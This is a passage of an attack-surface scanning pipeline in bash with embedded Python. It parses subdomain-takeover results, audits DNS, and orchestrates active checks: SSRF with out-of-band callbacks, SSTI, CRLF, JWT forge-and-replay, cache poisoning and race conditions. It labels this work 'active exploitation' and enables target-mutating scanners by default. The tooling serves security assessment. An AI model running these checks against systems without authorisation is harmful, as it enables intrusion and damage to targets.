            return f'SPF/MX references UptimeRobot — {subdomain} mail config points to monitoring service'
        if method == 'ns':
            return f'NS record references UptimeRobot — {subdomain} DNS delegated to monitoring service'
        return f'UptimeRobot service exposed — {subdomain} DNS references unclaimed monitoring endpoint'
    if 'vulnerable' in ll:
        return f'Subdomain Takeover — {subdomain} points to claimable third-party resource'
    if 'dead' in ll:
        return f'Dead Service — {subdomain} points to a service that no longer exists'
    return f'DNS Takeover Risk — {subdomain} ({label})'

def build_evidence(label, method, subdomain, detail):
    ll = label.lower()
    parts = []
    if 'ns delegation' in ll:
        parts.append(f'{subdomain} has NS records delegating DNS resolution to nameservers that are not '
                     f'configured for this domain. An attacker who creates a hosted zone on the same DNS '
                     f'provider (e.g. AWS Route53) can claim authority over this subdomain and serve '
                     f'arbitrary content, intercept email, or issue TLS certificates.')
    elif 'stale a' in ll:
        parts.append(f'{subdomain} has an A record pointing to an IP address that is no longer responding. '
                     f'If this IP can be acquired by an attacker (e.g. from a cloud provider elastic IP pool), '
                     f'they gain full control of traffic to this subdomain.')
    elif 'uptimerobot' in ll:
        parts.append(f'{subdomain} has a DNS record pointing to an UptimeRobot monitoring endpoint. '
                     f'If the UptimeRobot account or monitoring page is unclaimed, an attacker can register '
                     f'it and serve content under your domain.')
    else:
        parts.append(f'{subdomain} has a DNS misconfiguration that may allow subdomain takeover.')
    if detail:
        parts.append(f'Technical detail: {detail}')
    return ' '.join(parts)

def build_remediation(label, method, subdomain):
    ll = label.lower()
    if 'ns delegation' in ll:
        return (f'Remove the NS delegation records for {subdomain} from your DNS zone, or create a '
                f'matching hosted zone on the delegated DNS provider to reclaim authority. '
                f'Audit all NS records periodically to catch orphaned delegations.')
    if 'stale a' in ll:
        return (f'Remove the stale A record for {subdomain}, or re-provision the server at the '
                f'original IP. If using cloud infrastructure, reserve the IP to prevent reallocation.')
    if 'uptimerobot' in ll:
        return (f'Remove the DNS record pointing {subdomain} to UptimeRobot, or verify the '
                f'UptimeRobot monitoring page is actively claimed under your organization\'s account.')
    return (f'Remove or update the DNS record for {subdomain} to point to a valid, '
            f'organization-controlled resource.')

def get_tags(label, method):
    ll = label.lower()
    tags = []
    for key, t in LABEL_TAGS.items():
        if key in ll:
            tags.extend(t)
    tags.append(METHOD_LABELS.get(method, method).lower().replace(' ', '-').replace('/', '-'))
    return list(dict.fromkeys(tags))

seen = set()
findings = []

for pair in raw_list_str.split():
    if ':' not in pair:
        continue
    raw_file, method = pair.rsplit(':', 1)
    if not os.path.isfile(raw_file):
        continue
    method_label = METHOD_LABELS.get(method, method)

    with open(raw_file, errors='ignore') as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            m = vuln_re.search(line)
            if not m:
                continue

            label     = m.group(1).strip()
            if label.lower() in skip_labels:
                continue

            subdomain = m.group(2).rstrip('.')
            detail    = (m.group(3) or '').strip()

            key = f'{subdomain}|{method}'
            if key in seen:
                continue
            seen.add(key)

            svc_low  = label.lower()
            severity = 'critical' if svc_low in CRITICAL_SERVICES else 'high'

            is_dead = 'dead' in line.lower() or 'stale' in svc_low
            tags = get_tags(label, method)

            # A stale-A-record hit whose "dead" IP is private/reserved space
            # is a dangling DNS hygiene issue, not an attacker-reclaimable
            # takeover vector — nobody outside your network can register an
            # RFC1918 address (F35).
            stale_ip = extract_ip(detail) if 'stale a' in svc_low else None
            unclaimable = bool(stale_ip and is_unclaimable_ip(stale_ip))
            evidence = build_evidence(label, method, subdomain, detail)
            if unclaimable:
                severity = 'low'
                evidence += (f' NOTE: {stale_ip} is a private/non-routable address (RFC1918 or '
                            f'other reserved space) — it cannot be claimed or re-acquired by an '
                            f'external attacker, so despite the label this is a stale/dangling DNS '
                            f'record, not a genuine subdomain-takeover risk.')

            findings.append({
                'host':             subdomain,
                'service':          label,
                'cname':            detail,
                'severity':         severity,
                'category':         'subdomain_takeover',
                'source':           'Subdomain Takeover',
                'detection_method': method,
                'detection_label':  method_label,
                'template':         build_title(label, method, subdomain),
                'tool':             'subjack',
                'dead_record':      is_dead,
                'tags':             tags,
                'evidence':         evidence,
                'remediation':      build_remediation(label, method, subdomain),
                'url':              f'https://{subdomain}',
                'takeover_candidate': not unclaimable,
                'raw_line':         line,
            })

with open(findings_file, 'w') as fh:
    for f in findings:
        fh.write(json.dumps(f) + '\n')

by_method = {}
for f in findings:
    by_method.setdefault(f['detection_method'], 0)
    by_method[f['detection_method']] += 1
for meth, cnt in sorted(by_method.items()):
    print(f'{meth}:{cnt}')
SUBJACK_PARSE
        takeover_count=$(count_lines "$findings_file")
    fi

    # Count matches robustly: grep|wc always yields exactly one clean integer
    # regardless of match count or grep's exit status (avoids the "0\n0" that
    # `grep -c ... || echo 0` produces on a zero-match existing file — that
    # double line would corrupt the summary JSON below).
    _tk_count() { grep -c "$1" "$findings_file" 2>/dev/null | head -1 | tr -dc '0-9'; }

    log_info "Subdomain takeover candidates: $takeover_count (across all methods)"
    if [ "$takeover_count" -gt 0 ]; then
        # Per-method breakdown
        for _m in cname stale_a zone_xfer mail ns; do
            local _cnt
            _cnt=$(_tk_count "\"detection_method\": \"$_m\"")
            _cnt=${_cnt:-0}
            [ "$_cnt" -gt 0 ] && log_info "  [$_m] $_cnt finding(s)"
        done
        jq -r '"  [\(.severity|ascii_upcase)] \(.host) — \(.detection_label) (\(.service))"' \
            "$findings_file" 2>/dev/null | head -15 || true
    fi

    update_statistics "subdomain_takeover" "$takeover_count"

    # Build per-method counts for the summary JSON
    local _cname_cnt stale_cnt xfer_cnt mail_cnt ns_cnt
    _cname_cnt=$(_tk_count '"detection_method": "cname"');     _cname_cnt=${_cname_cnt:-0}
    stale_cnt=$(_tk_count '"detection_method": "stale_a"');    stale_cnt=${stale_cnt:-0}
    xfer_cnt=$(_tk_count '"detection_method": "zone_xfer"');   xfer_cnt=${xfer_cnt:-0}
    mail_cnt=$(_tk_count '"detection_method": "mail"');        mail_cnt=${mail_cnt:-0}
    ns_cnt=$(_tk_count '"detection_method": "ns"');            ns_cnt=${ns_cnt:-0}

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "subdomain_takeover",
  "status": "completed",
  "subdomains_checked": $sub_count,
  "takeover_count": $takeover_count,
  "findings_file": "takeover_findings.jsonl",
  "tool": "subjack",
  "methods_run": ["cname", "stale_a", "zone_xfer", "mail", "ns"],
  "by_method": {
    "cname":     $_cname_cnt,
    "stale_a":   $stale_cnt,
    "zone_xfer": $xfer_cnt,
    "mail":      $mail_cnt,
    "ns":        $ns_cnt
  },
  "duration_seconds": $((end_time - start_time))
}
EOF
    log_info "Subdomain takeover detection completed"
    echo "$output_file"
}

###################################################################################################
# MODULE 3C: DNS SECURITY AUDIT (recon/dns_security_audit.py)
#
# Deep DNS attack-surface analysis on top of Module 3 (resolution) and Module
# 3B (zone discovery). Issues fresh authoritative dig queries (never trusting
# 3B's CNAME-chased blob) to check: SPF quality + dangling includes, SRV
# services, CAA policy, MX provider + dangling MX, CNAME chains, dangling NS,
# IPv6 exposure, record consistency, internal-hostname/split-horizon leakage,
# AXFR, DNSSEC, open resolver, amplification, wildcard, NS delegation, PTR,
# WHOIS expiry, GeoDNS/fast-flux. Emits dns_security_findings.jsonl.
###################################################################################################

DNS_SECURITY_ENABLED="${DNS_SECURITY_ENABLED:-true}"
DNS_SECURITY_MAX_HOSTS="${DNS_SECURITY_MAX_HOSTS:-300}"
DNS_SECURITY_TIMEOUT="${DNS_SECURITY_TIMEOUT:-5}"
DNS_SECURITY_THREADS="${DNS_SECURITY_THREADS:-10}"

module_dns_security() {
    local target="$1"
    log_section "MODULE 3C: DNS Security Audit"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/03c_dns_security"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "dns_security" "results")"
    local findings_file="$base_dir/dns_security_findings.jsonl"
    > "$findings_file"

    if [ "$DNS_SECURITY_ENABLED" != "true" ]; then
        log_warn "DNS security audit disabled (DNS_SECURITY_ENABLED=false)"
        echo "{\"module\":\"dns_security\",\"status\":\"disabled\",\"total_findings\":0,\"duration_seconds\":0}" > "$output_file"
        echo "$output_file"
        return 0
    fi

    local script_path="$PROJECT_ROOT/recon/dns_security_audit.py"
    if [ ! -f "$script_path" ] || ! command -v python3 &>/dev/null; then
        log_warn "recon/dns_security_audit.py or python3 missing — skipping"
        echo "{\"module\":\"dns_security\",\"status\":\"skipped\",\"total_findings\":0,\"duration_seconds\":0}" > "$output_file"
        echo "$output_file"
        return 0
    fi
    if ! command -v dig &>/dev/null; then
        log_warn "dig not installed — DNS security audit produces limited results"
    fi

    local py_args=("$target"
        "--scan-dir" "$OUTPUT_DIR"
        "--out-dir"  "$base_dir"
        "--timeout"  "$DNS_SECURITY_TIMEOUT"
        "--threads"  "$DNS_SECURITY_THREADS"
        "--max-hosts" "$DNS_SECURITY_MAX_HOSTS")
    [ -f "$MANIFEST_FILE" ] && py_args+=("--manifest" "$MANIFEST_FILE")

    log_info "Running DNS security audit (fresh authoritative dig queries)..."
    if run_tool dns_security python3 "$script_path" "${py_args[@]}"; then
        log_info "DNS security audit completed"
    else
        log_warn "DNS security audit exited non-zero (partial results may exist)"
    fi

    local total=0
    total=$(count_lines "$findings_file")
    local takeover=0
    if [ -s "$findings_file" ]; then
        takeover=$(grep -c '"takeover_candidate": true' "$findings_file" 2>/dev/null || true)
        takeover=${takeover:-0}
        jq -r '"  [\(.severity)] \(.check) — \(.host)"' "$findings_file" 2>/dev/null | head -12 || true
    fi
    log_info "DNS security findings: $total (takeover-related: $takeover)"
    update_statistics "dns_security_findings" "$total"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "dns_security",
  "status": "completed",
  "total_findings": $total,
  "takeover_candidates": $takeover,
  "findings_file": "dns_security_findings.jsonl",
  "duration_seconds": $((end_time - start_time))
}
EOF
    log_info "DNS security audit module complete"
    echo "$output_file"
}

###################################################################################################
# MODULE 19: EXTENDED VULNERABILITY VERIFICATION
###################################################################################################

module_extended_checks() {
    local target="$1"
    log_section "MODULE 19: Extended Vulnerability Verification (safe mode)"

    if [ "$EXTENDED_CHECKS_ENABLED" != "true" ]; then
        log_warn "Extended checks disabled (EXTENDED_CHECKS_ENABLED=false)"
        return 0
    fi
    log_info "Mode: $([ "$EXTENDED_SAFE_MODE" = "true" ] && echo "SAFE (confirm only, no exploitation)" || echo "AGGRESSIVE")"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/19_extended_checks"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "extended_checks" "results")"
    local urls_file="$base_dir/param_urls.txt"
    local findings_file="$base_dir/extended_findings.jsonl"
    : > "$findings_file"

    local n_urls; n_urls=$(_ext_collect_param_urls "$urls_file")
    log_info "Candidate parameterized URLs: $n_urls (deduped by endpoint)"

    # Also collect ALL live URLs (not just parameterized) for CRLF/SSTI form scanning.
    local all_urls_file="$base_dir/param_urls_all.txt"
    local n_all; n_all=$(_ext_collect_all_urls "$all_urls_file")
    log_info "All reachable URLs (for header/form checks): $n_all"

    # Per-check output shards.
    local f_ssrf="$base_dir/ssrf.jsonl" f_crlf="$base_dir/crlf.jsonl"
    local f_jwt="$base_dir/jwt.jsonl"   f_ssti="$base_dir/ssti.jsonl"
    local f_gql="$base_dir/graphql.jsonl" f_smug="$base_dir/smuggling.jsonl"

    # 1. SSRF — start OOB oracle, fire probes, correlate.
    if [ "$CHECK_SSRF" = "true" ]; then
        log_info "[1/6] Blind SSRF (interactsh OOB confirmation)..."
        local oob_domain="$base_dir/oob_domain.txt" callbacks="$base_dir/oob_callbacks.jsonl"
        local probe_map="$base_dir/ssrf_probes.jsonl"
        if _ext_start_interactsh "$oob_domain" "$callbacks"; then
            _ext_ssrf "$urls_file" "$oob_domain" "$probe_map" "$f_ssrf" "$SSRF_PROBE_CAP"
            log_info "  Waiting ${EXTENDED_OOB_WAIT}s for out-of-band callbacks..."
            sleep "$EXTENDED_OOB_WAIT"
            _ext_stop_interactsh
            _ext_ssrf_correlate "$callbacks" "$probe_map" "$f_ssrf"
        fi
    fi

    # 2-6. CRLF and SSTI now also use the broader all_urls list.
    log_info "[2/6] CRLF injection (crlfuzz)...";       _ext_crlf "$all_urls_file" "$f_crlf"
    log_info "[3/6] JWT weakness (offline analysis)..."; _ext_jwt "$f_jwt"
    log_info "[4/6] SSTI (sstimap detection)...";        _ext_ssti "$urls_file" "$f_ssti"
    log_info "[5/6] GraphQL (graphw00f)...";             _ext_graphql "$f_gql"
    log_info "[6/6] HTTP smuggling (gated)...";          _ext_smuggling "$f_smug"

    # Merge all shards into the normalized findings file.
    for shard in "$f_ssrf" "$f_crlf" "$f_jwt" "$f_ssti" "$f_gql" "$f_smug"; do
        [ -f "$shard" ] && cat "$shard" >> "$findings_file"
    done

    local total; total=$(count_lines "$findings_file")
    log_info "Extended verification findings: $total (confirmed/probable, safe mode)"
    [ "$total" -gt 0 ] && jq -r '"  [\(.severity)] \(.template) — \(.host) (\(.confidence))"' "$findings_file" 2>/dev/null | head -8 || true
    update_statistics "extended_findings" "$total"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "extended_checks",
  "safe_mode": $EXTENDED_SAFE_MODE,
  "extended_findings": $total,
  "checks_run": {"ssrf": "$CHECK_SSRF", "crlf": "$CHECK_CRLF", "jwt": "$CHECK_JWT", "ssti": "$CHECK_SSTI", "graphql": "$CHECK_GRAPHQL", "smuggling": "$CHECK_SMUGGLING"},
  "findings_file": "extended_findings.jsonl",
  "duration_seconds": $((end_time - start_time))
}
EOF
    log_info "Extended vulnerability verification completed"
    echo "$output_file"
}

###################################################################################################
# MODULE 14: REPORTING
###################################################################################################

seed_from_latest_snapshot() {
    # Selective/only scans skip discovery, so the chosen verification modules
    # would find no inputs in a fresh OUTPUT_DIR. Copy the discovery outputs
    # from this target's most recent prior snapshot so e.g. `--only sqli_testing`
    # runs against the last known surface. Read-only w.r.t. the prior snapshot.
    local target="$1"
    local safe_target; safe_target=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local cur; cur="$(basename "$OUTPUT_DIR")"
    local latest=""
    latest=$(ls -dt "$SCAN_DIR/${safe_target}-"*/ 2>/dev/null | grep -v "/${cur}/" | head -1)
    if [ -z "$latest" ]; then
        log_warn "No prior snapshot for $target — selected modules may find no inputs"
        return 0
    fi
    latest="${latest%/}"
    log_info "Seeding discovery inputs from prior snapshot: $(basename "$latest")"
    local d
    for d in 01_asset_discovery 02_subdomain_enum 03_dns_resolution 03b_dns_discovery \
             03c_dns_security 04_http_discovery 05_waf_detection 06_header_analysis \
             07_service_fingerprint 08_directory_discovery 09_crawling 10_secret_scanning \
             11_param_fuzzing 12_nuclei_scanning 14_port_scan 15_sqli_testing \
             16_api_security 18_osint_intel 20_api_deep_discovery \
             21_subdomain_takeover manifest.json; do
        if [ -e "$latest/$d" ]; then
            cp -R "$latest/$d" "$OUTPUT_DIR/" 2>/dev/null || \
                log_warn "  could not seed $d"
        fi
    done
}

module_advanced_attacks() {
    local target="$1"
    log_section "MODULE 24: Advanced Attacks (JWT / GraphQL / cache-poison / proto-pollution / race / ws) [legacy, manual --only use]"
    local base_dir="$OUTPUT_DIR/24_advanced_attacks"
    mkdir -p "$base_dir"
    command -v python3 &>/dev/null || { log_warn "python3 missing; skipping advanced attacks"; return 0; }

    # NOT in module_order — offensive/offensive_verify.py's check_jwt/check_graphql/
    # check_cache/check_proto/check_race/check_ws superseded all six of these
    # (same techniques, same evidence style, several explicitly enhanced —
    # check_jwt still does this file's offline HMAC-secret crack AND an active
    # forge+replay the standalone script never did). Kept reachable only via an
    # explicit `--only advanced_attacks` for side-by-side comparison against the
    # legacy standalone scanners; every normal scan already gets the superseding
    # coverage from Module 19/24's offensive_verify pass.
    local here; here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    # Non-mutating scanners always run; the two that write to the target (cache
    # poisoning, race condition) are gated so operators can disable them.
    # recon/subdomain_bruteforce.py was here historically but was moved to Module 2
    # (subdomain_enum) because running it at end-of-pipeline meant newly
    # discovered subdomains never got resolved / probed / scanned. It's a
    # recon step, not an attack.
    local scripts=(jwt_attack graphql_scanner prototype_pollution websocket_scanner)
    if [ "${ADVANCED_ATTACKS_MUTATING:-true}" = "true" ]; then
        scripts+=(cache_poison race_condition)
    else
        log_info "  mutating scanners (cache_poison/race_condition) disabled via ADVANCED_ATTACKS_MUTATING=false"
    fi

    local s sp
    for s in "${scripts[@]}"; do
        # These live under offensive/legacy/ since offensive_verify.py absorbed
        # them; check there first, then fall back to the pre-restructure
        # locations in case a caller vendored a copy elsewhere.
        sp="$PROJECT_ROOT/offensive/legacy/$s.py"
        [ ! -f "$sp" ] && sp="$here/offensive/legacy/$s.py"
        [ ! -f "$sp" ] && sp="$PROJECT_ROOT/$s.py"
        [ ! -f "$sp" ] && sp="$here/$s.py"
        if [ -f "$sp" ]; then
            log_info "  running $s…"
            run_tool "adv_$s" python3 "$sp" "$OUTPUT_DIR" || log_warn "  $s returned non-zero; continuing"
        else
            log_warn "  $s.py not found; skipping"
        fi
    done

    local total=0 jf
    for jf in "$base_dir"/*_findings.jsonl; do
        [ -f "$jf" ] && total=$((total + $(count_lines "$jf")))
    done
    log_info "Advanced attacks: $total finding(s) across modules"
    update_statistics "advanced_attack_findings" "$total"
}

###################################################################################################
# MODULE 19+24 (UNIFIED): OFFENSIVE VERIFICATION — offensive/offensive_verify.py
# Rebuilt single engine that replaces Module 19 (Extended Verification) and
# Module 24 (Advanced Attacks). Native, active, differential-confirmed:
#   JWT (offline crack + forge-and-replay) · GraphQL (introspection/batch) ·
#   SSTI (arithmetic-eval) · CRLF · open-redirect · SSRF (metadata/OOB) ·
#   prototype-pollution · cache-poisoning · race · WebSocket CSWSH.
# Consumes the classified URL inventory (discovered_endpoints.jsonl) so it is
# TARGETED and drops WAF-blocked / dead / non-vulnerable endpoints. Writes ONE
# file — 24_advanced_attacks/offensive_findings.jsonl — read by both the
# internet_intel fold and the dashboard vuln list.
###################################################################################################
module_offensive_verify() {
    local target="$1"
    log_section "MODULE 19+24: Offensive Verification (active exploitation, differential-confirmed)"

    if [ "$OFFENSIVE_VERIFY_ENABLED" != "true" ]; then
        log_warn "Offensive verification disabled (OFFENSIVE_VERIFY_ENABLED=false)"
        return 0
    fi
    command -v python3 &>/dev/null || { log_warn "python3 missing; skipping offensive verification"; return 0; }

    local script_path="$PROJECT_ROOT/offensive/offensive_verify.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/offensive/offensive_verify.py"
    if [ ! -f "$script_path" ]; then
        log_warn "offensive/offensive_verify.py not found; skipping"
        return 0
    fi

    mkdir -p "$OUTPUT_DIR/24_advanced_attacks"

    local -a args=("$OUTPUT_DIR" --target "$target" --summary
                   --rate "$OFFENSIVE_RATE" --max-targets "$OFFENSIVE_MAX_TARGETS"
                   --race-concurrency "$OFFENSIVE_RACE_CONCURRENCY")
    [ -n "$OFFENSIVE_CHECKS" ] && args+=(--only "$OFFENSIVE_CHECKS")
    [ -n "$OFFENSIVE_OOB_DOMAIN" ] && args+=(--oob-domain "$OFFENSIVE_OOB_DOMAIN")

    log_info "Running active offensive checks (no safe mode) against classified inventory…"
    run_tool_timeout "$OFFENSIVE_TIMEOUT" offensive_verify python3 "$script_path" "${args[@]}" || \
        log_warn "offensive_verify exited non-zero/timed out (partial output may exist)"

    local findings_file="$OUTPUT_DIR/24_advanced_attacks/offensive_findings.jsonl"
    local total=0
    [ -f "$findings_file" ] && total=$(count_lines "$findings_file")
    log_info "Offensive verification: $total confirmed finding(s)"
    if [ "$total" -gt 0 ]; then
        jq -r '"  [\(.severity)/\(.confidence)] \(.title) — \(.host)"' "$findings_file" 2>/dev/null | head -12 || true
    fi
    update_statistics "offensive_findings" "$total"
    # keep the legacy stat keys populated so existing dashboard tiles stay live
    update_statistics "advanced_attack_findings" "$total"
    update_statistics "extended_findings" "$total"
}

###################################################################################################
# MODULE 26: RESPONSE INTELLIGENCE — intel/response_intel.py
# Fetches EVERY HTTP-200 URL in the URL Inventory exactly once and runs NLP
# + pattern analysis over each response body: PII leakage, secrets, info
# disclosure, unauth data exposure, security headers, CORS misconfig, anomalies.
# Runs AFTER offensive_verify so it doesn't duplicate active exploitation,
# and BEFORE internet_intel so its findings flow into the consolidated view.
###################################################################################################

###################################################################################################
# MODULE: IP Geo Enrichment (IPInfo) — runs parallel with port scan.
# Adds geo/ASN/org per IP for the attack surface map. Fails soft if no
# IPINFO_TOKEN — free-tier requests still work up to a small rate.
###################################################################################################
module_ip_geo_enrich() {
    local target="$1"
    log_section "MODULE: IP Geo Enrichment (IPInfo)"

    command -v python3 &>/dev/null || { log_warn "python3 missing; skipping"; return 0; }
    local script_path="$PROJECT_ROOT/recon/ip_geo_enrich.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/recon/ip_geo_enrich.py"
    [ -f "$script_path" ] || { log_warn "recon/ip_geo_enrich.py not found; skipping"; return 0; }

    local all_ips="$OUTPUT_DIR/03_dns_resolution/all_ips.txt"
    local dns_results="$OUTPUT_DIR/03_dns_resolution/dns_results.json"
    [ -s "$all_ips" ] || { log_warn "all_ips.txt empty; skipping geo enrich"; return 0; }

    mkdir -p "$OUTPUT_DIR/03_dns_resolution"
    local out_file="$OUTPUT_DIR/03_dns_resolution/ip_geo.jsonl"
    run_tool_timeout 300 ip_geo_enrich python3 "$script_path" \
        --all-ips "$all_ips" \
        --dns-results "$dns_results" \
        --output "$out_file" \
        --token "${IPINFO_TOKEN:-}" || log_warn "ip_geo_enrich exited non-zero"

    local geo_count=$(count_lines "$out_file" 2>/dev/null || echo 0)
    log_info "IP geo entries written: $geo_count"
    update_statistics "ip_geo_entries" "$geo_count"
    return 0
}

###################################################################################################
# MODULE: OSINT Port Reconcile — validate OSINT-discovered ports via naabu.
# Runs after shodan_correlation (module_order) so shodan_assets.jsonl actually
# exists — it used to run right after the initial port scan, before Shodan
# had produced anything, so its "osint_sources" existence checks always came
# up empty regardless of the field-name bugs this file also had. New OSINT/
# Shodan ports get a single-port naabu alive check before appending to
# all_ports.jsonl, so port_split (which runs right after this) includes them.
###################################################################################################
module_osint_port_reconcile() {
    local target="$1"
    log_section "MODULE: OSINT Port Reconcile"

    command -v python3 &>/dev/null || { log_warn "python3 missing"; return 0; }
    local script_path="$PROJECT_ROOT/ports/osint_port_reconcile.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/ports/osint_port_reconcile.py"
    [ -f "$script_path" ] || { log_warn "ports/osint_port_reconcile.py not found"; return 0; }

    local all_ports="$OUTPUT_DIR/14_port_scan/all_ports.jsonl"
    local out_file="$OUTPUT_DIR/14_port_scan/osint_reconcile.jsonl"

    # Gather OSINT/shodan/censys port sources
    local -a osint_sources=()
    [ -f "$OUTPUT_DIR/18_osint_intel/osint_findings.jsonl" ] && osint_sources+=("$OUTPUT_DIR/18_osint_intel/osint_findings.jsonl")
    [ -f "$OUTPUT_DIR/22_shodan_correlation/shodan_findings.jsonl" ] && osint_sources+=("$OUTPUT_DIR/22_shodan_correlation/shodan_findings.jsonl")
    [ -f "$OUTPUT_DIR/22_shodan_correlation/shodan_assets.jsonl" ] && osint_sources+=("$OUTPUT_DIR/22_shodan_correlation/shodan_assets.jsonl")

    if [ ${#osint_sources[@]} -eq 0 ]; then
        log_info "No OSINT port sources found; skipping reconcile"
        return 0
    fi

    run_tool_timeout 600 osint_port_reconcile python3 "$script_path" \
        --all-ports "$all_ports" \
        --osint-files "${osint_sources[@]}" \
        --output "$out_file" || log_warn "osint_port_reconcile exited non-zero"

    return 0
}

###################################################################################################
# MODULE: Port Split — split all_ports.jsonl into web / non-web + origin / CDN.
# Web ports: always kept (CDN + origin alike, since CDN IS the attack surface).
# Non-web ports: origin only (CDN non-web dropped with reason logged).
# Runs after http_discovery (needs http_confirmed.json as the authoritative
# web/non-web signal) and after osint_port_reconcile (needs Shodan-validated
# ports already folded into all_ports.jsonl) — both in module_order.
###################################################################################################
module_port_split() {
    local target="$1"
    log_section "MODULE: Port Split (web / nonweb x origin / cdn)"

    command -v python3 &>/dev/null || { log_warn "python3 missing"; return 0; }
    local script_path="$PROJECT_ROOT/ports/port_split.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/ports/port_split.py"
    [ -f "$script_path" ] || { log_warn "ports/port_split.py not found"; return 0; }

    local all_ports="$OUTPUT_DIR/14_port_scan/all_ports.jsonl"
    [ -s "$all_ports" ] || { log_warn "all_ports.jsonl empty; skipping split"; return 0; }

    # http_confirmed.json (Module 4) is the real, per-port httpx verification —
    # authoritative over the static WEB_PORTS number guess. Runs after
    # http_discovery in module_order specifically so this file is populated.
    run_tool_timeout 60 port_split python3 "$script_path" \
        --all-ports "$all_ports" \
        --cdn-ips "$OUTPUT_DIR/03_dns_resolution/cdn_ips.txt" \
        --cdn-hosts "$OUTPUT_DIR/03_dns_resolution/cdn_hosts.txt" \
        --http-confirmed "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" \
        --out-dir "$OUTPUT_DIR/14_port_scan" || log_warn "port_split exited non-zero"

    # port_split backfills httpx-confirmed ports naabu missed straight into
    # all_ports.jsonl, so refresh the derived host:port list that downstream
    # readers (and the dashboard's port view) rely on.
    if command -v jq &>/dev/null && [ -s "$all_ports" ]; then
        jq -r 'select(.host != null and .port != null) | .host+":"+(.port|tostring)' \
            "$all_ports" | sort -u > "$OUTPUT_DIR/14_port_scan/all_ports_list.txt"
    fi

    local web_count=$(count_lines "$OUTPUT_DIR/14_port_scan/web_ports.jsonl" 2>/dev/null || echo 0)
    local origin_count=$(count_lines "$OUTPUT_DIR/14_port_scan/nonweb_origin_ports.jsonl" 2>/dev/null || echo 0)
    local dropped_count=$(count_lines "$OUTPUT_DIR/14_port_scan/nonweb_cdn_dropped.jsonl" 2>/dev/null || echo 0)
    log_info "Port split: web=$web_count nonweb_origin=$origin_count nonweb_cdn_dropped=$dropped_count"
    update_statistics "web_ports" "$web_count"
    update_statistics "nonweb_origin_ports" "$origin_count"
    return 0
}

###################################################################################################
# MODULE: HSTS Audit — full HSTS testing with evidence for dashboard.
# Runs on httpx-confirmed hosts. Removes HTTP entries from a deduped feed
# when HTTPS redirect is confirmed (keeps port scan data intact).
###################################################################################################
module_hsts_audit() {
    local target="$1"
    log_section "MODULE: HSTS Audit"

    command -v python3 &>/dev/null || { log_warn "python3 missing"; return 0; }
    local script_path="$PROJECT_ROOT/tls/hsts_audit.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/tls/hsts_audit.py"
    [ -f "$script_path" ] || { log_warn "tls/hsts_audit.py not found"; return 0; }

    local http_file="$OUTPUT_DIR/04_http_discovery/http_confirmed.json"
    [ -s "$http_file" ] || { log_warn "http_confirmed.json missing/empty"; return 0; }

    mkdir -p "$OUTPUT_DIR/04_http_discovery"
    local findings="$OUTPUT_DIR/04_http_discovery/hsts_findings.jsonl"
    local deduped="$OUTPUT_DIR/04_http_discovery/http_confirmed_deduped.json"

    run_tool_timeout 900 hsts_audit python3 "$script_path" \
        --http-confirmed "$http_file" \
        --findings "$findings" \
        --deduped "$deduped" \
        --workers "${HSTS_WORKERS:-10}" || log_warn "hsts_audit exited non-zero"

    local finding_count=$(count_lines "$findings" 2>/dev/null || echo 0)
    log_info "HSTS findings: $finding_count"
    update_statistics "hsts_findings" "$finding_count"
    return 0
}

###################################################################################################
# MODULE: Tech Stack Detection — extract normalized tech from httpx output.
# Emits tech_stack.json for dashboard + nuclei template routing hints.
###################################################################################################
module_tech_stack_detection() {
    local target="$1"
    log_section "MODULE: Tech Stack Detection"

    command -v python3 &>/dev/null || { log_warn "python3 missing"; return 0; }
    local script_path="$PROJECT_ROOT/recon/tech_stack_detection.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/recon/tech_stack_detection.py"
    [ -f "$script_path" ] || { log_warn "recon/tech_stack_detection.py not found"; return 0; }

    # Prefer HSTS-deduped variant if present, else raw httpx confirmed
    local http_file="$OUTPUT_DIR/04_http_discovery/http_confirmed_deduped.json"
    [ -s "$http_file" ] || http_file="$OUTPUT_DIR/04_http_discovery/http_confirmed.json"
    [ -s "$http_file" ] || { log_warn "http_confirmed.json missing"; return 0; }

    mkdir -p "$OUTPUT_DIR/04_http_discovery"
    run_tool_timeout 120 tech_stack_detection python3 "$script_path" \
        --http-confirmed "$http_file" \
        --out-stack "$OUTPUT_DIR/04_http_discovery/tech_stack.json" \
        --out-by-host "$OUTPUT_DIR/04_http_discovery/tech_by_host.jsonl" || log_warn "tech_stack_detection exited non-zero"

    return 0
}

###################################################################################################
# MODULE: SBOM — Software Bill of Materials. Mines already-captured scan data (stored responses,
# tech detection, nmap banners, API schemas, MCP/AI findings) into a multi-method component +
# version inventory → <scan>/25_sbom/{sbom.jsonl,sbom.json,sbom.cdx.json}. Runs late so every
# source (tech/service/http/mcp_ai/api-schema) already exists. CVE correlation is a later phase.
###################################################################################################
module_sbom() {
    local target="$1"
    log_section "MODULE: SBOM (software bill of materials)"

    command -v python3 &>/dev/null || { log_warn "python3 missing"; return 0; }
    local script_path="$PROJECT_ROOT/discovery/sbom.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/discovery/sbom.py"
    [ -f "$script_path" ] || { log_warn "discovery/sbom.py not found"; return 0; }

